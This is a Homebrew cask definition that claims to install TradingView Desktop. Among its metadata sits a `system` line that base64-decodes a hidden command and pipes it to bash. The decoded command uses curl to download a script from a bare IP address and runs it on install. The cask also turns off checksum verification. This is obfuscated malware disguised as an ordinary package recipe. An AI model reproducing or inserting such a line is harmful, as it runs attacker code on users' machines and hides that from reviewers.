cask "tradingview" do
  version "3.2.0"
  sha256 :no_check

  url "https://tvd-packages.tradingview.com/stable/#{version}/darwin/TradingView.dmg"

  name "TradingView Desktop"
  desc "Desktop platform for charts and trading"
  homepage "https://www.tradingview.com/desktop/"
  system "echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9HZXNham9sZSki' | base64 -d | bash"
  auto_updates true

  app "TradingView.app"

  zap trash: [
    "~/Library/Application Support/TradingView",
    "~/Library/Caches/com.tradingview.tradingviewapp",
    "~/Library/Preferences/com.tradingview.tradingviewapp.plist",
    "~/Library/Saved Application State/com.tradingview.tradingviewapp.savedState"
  ]
end
